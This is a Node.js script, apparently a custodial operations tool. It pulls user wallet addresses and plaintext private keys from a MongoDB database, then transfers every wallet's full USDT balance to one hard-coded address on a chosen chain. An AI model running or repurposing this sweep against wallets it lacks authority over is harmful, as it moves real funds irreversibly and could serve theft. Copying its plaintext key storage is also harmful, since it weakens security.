#!/usr/bin/env node

import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import { execSync } from "child_process";
import { MongoClient } from "mongodb";
import { ethers } from "ethers";
import { createThirdwebClient, Engine, getContract, sendTransaction } from "thirdweb";
import { transfer, balanceOf } from "thirdweb/extensions/erc20";
import { arbitrum, bsc, ethereum, polygon } from "thirdweb/chains";
import { smartWallet, privateKeyToAccount } from "thirdweb/wallets";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const projectRoot = path.resolve(__dirname, "..");

const DEFAULT_DESTINATION = "0xa9356206D2d5Ea04aE36632C4C75936F9882Bb79";
const DEFAULT_CONCURRENCY = 8;
const LOCK_STALE_MS = 30 * 60 * 1000;

const parseEnvFile = (filePath) => {
  const out = {};
  const src = fs.readFileSync(filePath, "utf8");
  for (const line of src.split(/\r?\n/)) {
    const t = line.trim();
    if (!t || t.startsWith("#")) continue;
    const i = t.indexOf("=");
    if (i <= 0) continue;
    out[t.slice(0, i).trim()] = t.slice(i + 1).trim().replace(/^"|"$/g, "");
  }
  return out;
};

const normalizeString = (value) => (typeof value === "string" ? value.trim() : "");

const normalizeAddress = (value) => {
  const safe = normalizeString(value);
  if (!safe) return "";
  try {
    return ethers.utils.getAddress(safe);
  } catch {
    return "";
  }
};

const formatUnitsString = (rawValue, decimals) => {
  const raw = BigInt(rawValue);
  const base = 10n ** BigInt(decimals);
  const integer = raw / base;
  const fraction = raw % base;
  const fractionText = fraction.toString().padStart(decimals, "0").replace(/0+$/, "");
  return fractionText ? `${integer}.${fractionText}` : `${integer}`;
};

const withTimeout = async (promise, ms, label) => {
  let timer = null;
  const timeoutPromise = new Promise((_, reject) => {
    timer = setTimeout(() => reject(new Error(`${label}_timeout_after_${ms}ms`)), ms);
  });
  try {
    return await Promise.race([promise, timeoutPromise]);
  } finally {
    if (timer) clearTimeout(timer);
  }
};

const mapWithConcurrency = async (items, concurrency, mapper) => {
  if (!items.length) return [];
  const safeConcurrency = Math.max(1, Math.min(concurrency, items.length));
  const result = new Array(items.length);
  let cursor = 0;

  const workers = Array.from({ length: safeConcurrency }).map(async () => {
    while (true) {
      const index = cursor;
      cursor += 1;
      if (index >= items.length) return;
      result[index] = await mapper(items[index], index);
    }
  });

  await Promise.all(workers);
  return result;
};

const parseArgs = (argv) => {
  const args = {
    destination: DEFAULT_DESTINATION,
    concurrency: DEFAULT_CONCURRENCY,
    dryRun: false,
  };

  for (let i = 0; i < argv.length; i += 1) {
    const token = argv[i];
    if (token === "--to") {
      args.destination = argv[i + 1] || args.destination;
      i += 1;
      continue;
    }
    if (token === "--concurrency") {
      const n = Number(argv[i + 1]);
      if (Number.isFinite(n) && n > 0) args.concurrency = Math.floor(n);
      i += 1;
      continue;
    }
    if (token === "--dry-run") {
      args.dryRun = true;
      continue;
    }
  }

  return args;
};

const nowStamp = () => {
  const now = new Date();
  const pad = (n) => String(n).padStart(2, "0");
  return `${now.getUTCFullYear()}-${pad(now.getUTCMonth() + 1)}-${pad(now.getUTCDate())}T${pad(
    now.getUTCHours(),
  )}-${pad(now.getUTCMinutes())}-${pad(now.getUTCSeconds())}-${String(
    now.getUTCMilliseconds(),
  ).padStart(3, "0")}Z`;
};

const isRecurringSweepProcess = (pid) => {
  if (!Number.isFinite(pid) || pid <= 0) return false;
  try {
    const command = execSync(`ps -p ${Math.floor(pid)} -o command=`, {
      stdio: ["ignore", "pipe", "ignore"],
    })
      .toString()
      .trim();
    if (!command) return false;
    const firstToken = command.split(/\s+/)[0] || "";
    const isNodeProcess = /(^|\/)node($|[^/])/.test(firstToken);
    return isNodeProcess && command.includes("recurring-sweep-usdt.mjs");
  } catch {
    return false;
  }
};

const hasOtherRecurringSweepProcess = (selfPid = process.pid) => {
  try {
    const lines = execSync("ps -Ao pid=,command=", {
      stdio: ["ignore", "pipe", "ignore"],
    })
      .toString()
      .split(/\r?\n/);

    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      const firstSpace = trimmed.indexOf(" ");
      if (firstSpace <= 0) continue;
      const pid = Number(trimmed.slice(0, firstSpace).trim());
      const command = trimmed.slice(firstSpace + 1).trim();
      if (!Number.isFinite(pid) || pid <= 0 || pid === selfPid) continue;
      const firstToken = command.split(/\s+/)[0] || "";
      const isNodeProcess = /(^|\/)node($|[^/])/.test(firstToken);
      if (isNodeProcess && command.includes("recurring-sweep-usdt.mjs")) return true;
    }
  } catch {}
  return false;
};

const acquireLock = (lockPath) => {
  const ensureParent = path.dirname(lockPath);
  fs.mkdirSync(ensureParent, { recursive: true });

  if (hasOtherRecurringSweepProcess(process.pid)) {
    return null;
  }

  const tryCreate = () => {
    const fd = fs.openSync(lockPath, "wx");
    const payload = {
      pid: process.pid,
      startedAt: new Date().toISOString(),
    };
    fs.writeFileSync(fd, `${JSON.stringify(payload)}\n`, "utf8");
    return fd;
  };

  try {
    return tryCreate();
  } catch (error) {
    if (error?.code !== "EEXIST") throw error;
  }

  let shouldClear = false;
  try {
    const lockText = fs.readFileSync(lockPath, "utf8");
    const lockInfo = JSON.parse(lockText);
    const lockPid = Number(lockInfo?.pid);
    if (Number.isFinite(lockPid) && lockPid > 0) {
      try {
        process.kill(lockPid, 0);
        if (isRecurringSweepProcess(lockPid)) {
          return null;
        }
        shouldClear = true;
      } catch {
        shouldClear = true;
      }
    } else {
      const lockStartedAt = Date.parse(lockInfo?.startedAt || "");
      const ageMs = Number.isFinite(lockStartedAt) ? Date.now() - lockStartedAt : Infinity;
      if (ageMs >= LOCK_STALE_MS) {
        shouldClear = true;
      } else {
        return null;
      }
    }
  } catch {
    shouldClear = true;
  }

  if (!shouldClear) return null;
  if (hasOtherRecurringSweepProcess(process.pid)) {
    return null;
  }
  try {
    fs.unlinkSync(lockPath);
  } catch {}

  return tryCreate();
};

const main = async () => {
  const args = parseArgs(process.argv.slice(2));
  const destination = normalizeAddress(args.destination);
  if (!destination) {
    throw new Error(`Invalid destination wallet: ${args.destination}`);
  }

  const env = parseEnvFile(path.join(projectRoot, ".env"));
  const mongoUri = normalizeString(env.MONGODB_URI);
  const dbName = normalizeString(env.MONGODB_DB_NAME) || "georgia";
  const thirdwebSecretKey = normalizeString(env.THIRDWEB_SECRET_KEY);
  const vaultAccessToken = normalizeString(env.THIRDWEB_VAULT_ACCESS_TOKEN);
  const chainName = normalizeString(env.NEXT_PUBLIC_CHAIN).toLowerCase() || "bsc";

  if (!mongoUri) throw new Error("MONGODB_URI is required");
  if (!thirdwebSecretKey) throw new Error("THIRDWEB_SECRET_KEY is required");

  const chainConfig =
    chainName === "ethereum"
      ? ethereum
      : chainName === "polygon"
        ? polygon
        : chainName === "bsc"
          ? bsc
          : arbitrum;

  const usdtContractAddress =
    chainName === "ethereum"
      ? "0xdAC17F958D2ee523a2206206994597C13D831ec7"
      : chainName === "polygon"
        ? "0xc2132D05D31c914a87C6611C10748AEb04B58e8F"
        : chainName === "bsc"
          ? "0x55d398326f99059fF775485246999027B3197955"
          : "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9";
  const usdtDecimals = chainName === "bsc" ? 18 : 6;

  const reportsDir = path.join(projectRoot, "reports");
  fs.mkdirSync(reportsDir, { recursive: true });
  const stamp = nowStamp();
  const lockPath = path.join(projectRoot, ".locks", "recurring-sweep-usdt.lock");
  const checkpointPath = path.join(reportsDir, `recurring-sweep-checkpoint-${stamp}.json`);
  const finalPath = path.join(reportsDir, `recurring-sweep-result-${stamp}.json`);

  const lockFd = acquireLock(lockPath);
  if (lockFd === null) {
    console.log("[skip] another recurring sweep process is already running.");
    return;
  }

  const startedAt = new Date();
  let done = 0;
  let success = 0;
  let failed = 0;
  let skipped = 0;
  let transferredRaw = 0n;
  let results = [];

  const writeCheckpoint = () => {
    fs.writeFileSync(
      checkpointPath,
      `${JSON.stringify(
        {
          updatedAt: new Date().toISOString(),
          startedAt: startedAt.toISOString(),
          destination,
          chain: chainName,
          usdtContract: usdtContractAddress,
          dryRun: args.dryRun,
          progress: {
            done,
            success,
            failed,
            skipped,
            transferredUsdt: formatUnitsString(transferredRaw, usdtDecimals),
          },
          results,
        },
        null,
        2,
      )}\n`,
      "utf8",
    );
  };

  try {
    const mongo = new MongoClient(mongoUri);
    await mongo.connect();
    const usersCollection = mongo.db(dbName).collection("users");

    const privateKeyUsers = await usersCollection
      .find(
        {
          walletAddress: { $exists: true, $ne: null, $nin: [""] },
          walletPrivateKey: { $exists: true, $ne: null, $nin: [""] },
        },
        {
          projection: {
            _id: 0,
            id: 1,
            storecode: 1,
            nickname: 1,
            walletAddress: 1,
            walletPrivateKey: 1,
          },
        },
      )
      .toArray();

    const privateKeyByWallet = new Map();
    for (const u of privateKeyUsers) {
      const walletAddress = normalizeAddress(u.walletAddress);
      const walletPrivateKey = normalizeString(u.walletPrivateKey);
      if (!walletAddress || !walletPrivateKey) continue;
      const key = walletAddress.toLowerCase();
      if (!privateKeyByWallet.has(key)) {
        privateKeyByWallet.set(key, {
          walletAddress,
          walletPrivateKey,
          id: u.id ?? "",
          storecode: normalizeString(u.storecode),
          nickname: normalizeString(u.nickname),
        });
      }
    }

    const thirdwebClient = createThirdwebClient({ secretKey: thirdwebSecretKey });
    const usdtContract = getContract({
      client: thirdwebClient,
      chain: chainConfig,
      address: usdtContractAddress,
    });

    const serverWalletByAddress = new Map();
    if (vaultAccessToken) {
      let page = 1;
      while (true) {
        const res = await Engine.getServerWallets({ client: thirdwebClient, page, limit: 500 });
        const accounts = Array.isArray(res?.accounts) ? res.accounts : [];
        for (const account of accounts) {
          const signerAddress = normalizeAddress(account?.address);
          const smartAccountAddress = normalizeAddress(account?.smartAccountAddress);
          const label = normalizeString(account?.label);
          if (signerAddress) {
            serverWalletByAddress.set(signerAddress.toLowerCase(), {
              signerAddress,
              smartAccountAddress: smartAccountAddress || "",
              label,
            });
          }
          if (smartAccountAddress) {
            serverWalletByAddress.set(smartAccountAddress.toLowerCase(), {
              signerAddress: signerAddress || "",
              smartAccountAddress,
              label,
            });
          }
        }
        if (!res?.nextPage || accounts.length === 0) break;
        page = res.nextPage;
      }
    }

    const serverWalletAddresses = Array.from(serverWalletByAddress.keys()).map((k) =>
      normalizeAddress(k),
    );
    const normalizedServerAddresses = serverWalletAddresses.filter(Boolean);

    const usersOnServerWallet = normalizedServerAddresses.length
      ? await usersCollection
          .find(
            { walletAddress: { $in: normalizedServerAddresses } },
            { projection: { _id: 0, walletAddress: 1 } },
          )
          .toArray()
      : [];

    await mongo.close();

    const controllableByServerWallet = new Set(
      usersOnServerWallet
        .map((u) => normalizeAddress(u.walletAddress).toLowerCase())
        .filter(Boolean),
    );

    const candidateMap = new Map();

    for (const [key, value] of privateKeyByWallet.entries()) {
      if (key === destination.toLowerCase()) continue;
      candidateMap.set(key, {
        walletAddress: value.walletAddress,
        mode: "private-key",
        privateKeyInfo: value,
        serverInfo: null,
      });
    }

    for (const key of controllableByServerWallet) {
      if (key === destination.toLowerCase()) continue;
      if (candidateMap.has(key)) continue;
      const walletAddress = normalizeAddress(key);
      const serverInfo = serverWalletByAddress.get(key) || null;
      if (!walletAddress || !serverInfo) continue;
      candidateMap.set(key, {
        walletAddress,
        mode: "server-wallet",
        privateKeyInfo: null,
        serverInfo,
      });
    }

    const candidates = Array.from(candidateMap.values());

    console.log(`[info] start recurring sweep dryRun=${args.dryRun ? "yes" : "no"}`);
    console.log(`[info] destination=${destination}`);
    console.log(
      `[info] candidates=${candidates.length} privateKey=${candidates.filter((c) => c.mode === "private-key").length} serverWallet=${candidates.filter((c) => c.mode === "server-wallet").length}`,
    );
    console.log(`[info] chain=${chainName} usdt=${usdtContractAddress}`);
    console.log(`[info] checkpoint=${checkpointPath}`);

    results = new Array(candidates.length);
    writeCheckpoint();

    const runOne = async (candidate, index) => {
      try {
        const rawBalance = BigInt(
          await withTimeout(
            balanceOf({ contract: usdtContract, address: candidate.walletAddress }),
            20000,
            `balance_${index + 1}`,
          ),
        );

        if (rawBalance <= 0n) {
          return {
            walletAddress: candidate.walletAddress,
            mode: candidate.mode,
            status: "skipped",
            reason: "zero_balance",
            rawBalance: "0",
            usdtBalance: "0",
          };
        }

        const usdtAmount = formatUnitsString(rawBalance, usdtDecimals);
        if (args.dryRun) {
          return {
            walletAddress: candidate.walletAddress,
            mode: candidate.mode,
            status: "success",
            senderType: "dry-run",
            rawBalance: rawBalance.toString(),
            usdtBalance: usdtAmount,
            transactionHash: "",
          };
        }

        const tx = transfer({
          contract: usdtContract,
          to: destination,
          amount: usdtAmount,
        });

        if (candidate.mode === "private-key") {
          const personalAccount = privateKeyToAccount({
            client: thirdwebClient,
            privateKey: candidate.privateKeyInfo.walletPrivateKey,
          });

          const walletLower = candidate.walletAddress.toLowerCase();
          const eoaAddress = normalizeAddress(personalAccount.address).toLowerCase();
          let senderAccount = null;
          let senderType = "";

          if (walletLower === eoaAddress) {
            senderAccount = personalAccount;
            senderType = "eoa";
          } else {
            const smart = smartWallet({ chain: chainConfig, sponsorGas: true });
            const smartAccount = await withTimeout(
              smart.connect({ client: thirdwebClient, personalAccount }),
              45000,
              `smart_connect_${index + 1}`,
            );
            const smartAddress = normalizeAddress(smartAccount.address).toLowerCase();
            if (walletLower === smartAddress) {
              senderAccount = smartAccount;
              senderType = "smart";
            } else {
              return {
                walletAddress: candidate.walletAddress,
                mode: candidate.mode,
                status: "skipped",
                reason: `sender_mismatch eoa=${eoaAddress || "-"} smart=${smartAddress || "-"}`,
                rawBalance: rawBalance.toString(),
                usdtBalance: usdtAmount,
              };
            }
          }

          const sent = await withTimeout(
            sendTransaction({ transaction: tx, account: senderAccount }),
            120000,
            `send_${index + 1}`,
          );

          return {
            walletAddress: candidate.walletAddress,
            mode: candidate.mode,
            status: "success",
            senderType,
            rawBalance: rawBalance.toString(),
            usdtBalance: usdtAmount,
            transactionHash: normalizeString(sent?.transactionHash) || "",
          };
        }

        if (candidate.mode === "server-wallet") {
          const signerAddress = normalizeAddress(candidate.serverInfo?.signerAddress);
          const smartAccountAddress = normalizeAddress(candidate.serverInfo?.smartAccountAddress);
          const walletLower = candidate.walletAddress.toLowerCase();
          let wallet = null;
          let senderType = "";

          if (smartAccountAddress && signerAddress && smartAccountAddress.toLowerCase() === walletLower) {
            wallet = Engine.serverWallet({
              client: thirdwebClient,
              vaultAccessToken,
              address: smartAccountAddress,
              chain: chainConfig,
              executionOptions: {
                type: "ERC4337",
                signerAddress,
                smartAccountAddress,
                entrypointVersion: "0.7",
              },
            });
            senderType = "server-smart";
          } else if (signerAddress && signerAddress.toLowerCase() === walletLower) {
            wallet = Engine.serverWallet({
              client: thirdwebClient,
              vaultAccessToken,
              address: signerAddress,
              chain: chainConfig,
            });
            senderType = "server-eoa";
          } else if (smartAccountAddress && signerAddress) {
            wallet = Engine.serverWallet({
              client: thirdwebClient,
              vaultAccessToken,
              address: smartAccountAddress,
              chain: chainConfig,
              executionOptions: {
                type: "ERC4337",
                signerAddress,
                smartAccountAddress,
                entrypointVersion: "0.7",
              },
            });
            senderType = "server-smart-fallback";
          } else {
            return {
              walletAddress: candidate.walletAddress,
              mode: candidate.mode,
              status: "failed",
              reason: "server_wallet_mapping_invalid",
              rawBalance: rawBalance.toString(),
              usdtBalance: usdtAmount,
            };
          }

          const enqueue = await withTimeout(
            wallet.enqueueTransaction({ transaction: tx }),
            60000,
            `engine_enqueue_${index + 1}`,
          );
          const transactionId = normalizeString(enqueue?.transactionId);
          if (!transactionId) throw new Error("engine_transaction_id_missing");

          const waitResult = await withTimeout(
            Engine.waitForTransactionHash({ client: thirdwebClient, transactionId }),
            120000,
            `engine_wait_${index + 1}`,
          );

          return {
            walletAddress: candidate.walletAddress,
            mode: candidate.mode,
            status: "success",
            senderType,
            rawBalance: rawBalance.toString(),
            usdtBalance: usdtAmount,
            transactionId,
            transactionHash: normalizeString(waitResult?.transactionHash) || "",
          };
        }

        return {
          walletAddress: candidate.walletAddress,
          mode: candidate.mode,
          status: "skipped",
          reason: "unsupported_mode",
          rawBalance: rawBalance.toString(),
          usdtBalance: usdtAmount,
        };
      } catch (error) {
        return {
          walletAddress: candidate.walletAddress,
          mode: candidate.mode,
          status: "failed",
          reason: error instanceof Error ? error.message : String(error),
          rawBalance: "0",
          usdtBalance: "0",
        };
      }
    };

    await mapWithConcurrency(candidates, args.concurrency, async (candidate, index) => {
      const result = await runOne(candidate, index);
      results[index] = result;
      done += 1;

      if (result.status === "success") {
        success += 1;
        transferredRaw += BigInt(result.rawBalance || "0");
      } else if (result.status === "failed") {
        failed += 1;
      } else {
        skipped += 1;
      }

      if (done % 25 === 0 || result.status === "failed" || done === candidates.length) {
        console.log(
          `[progress] done=${done}/${candidates.length} success=${success} failed=${failed} skipped=${skipped} transferred=${formatUnitsString(transferredRaw, usdtDecimals)} USDT`,
        );
      }
      if (done % 25 === 0 || done === candidates.length) {
        writeCheckpoint();
      }
    });

    const finishedAt = new Date();
    const summary = {
      startedAt: startedAt.toISOString(),
      finishedAt: finishedAt.toISOString(),
      destination,
      chain: chainName,
      usdtContract: usdtContractAddress,
      dryRun: args.dryRun,
      totalCandidates: candidates.length,
      success,
      failed,
      skipped,
      transferredUsdt: formatUnitsString(transferredRaw, usdtDecimals),
    };

    fs.writeFileSync(finalPath, `${JSON.stringify({ summary, results }, null, 2)}\n`, "utf8");
    writeCheckpoint();

    console.log(
      `[done] success=${success} failed=${failed} skipped=${skipped} transferred=${summary.transferredUsdt} USDT`,
    );
    console.log(`[report] final=${finalPath}`);
    console.log(`[report] checkpoint=${checkpointPath}`);
  } finally {
    try {
      fs.closeSync(lockFd);
    } catch {}
    try {
      const lockText = fs.readFileSync(lockPath, "utf8");
      const lockInfo = JSON.parse(lockText);
      if (Number(lockInfo?.pid) === process.pid) {
        fs.unlinkSync(lockPath);
      }
    } catch {}
  }
};

main().catch((error) => {
  console.error("[error]", error instanceof Error ? error.message : String(error));
  process.exit(1);
});
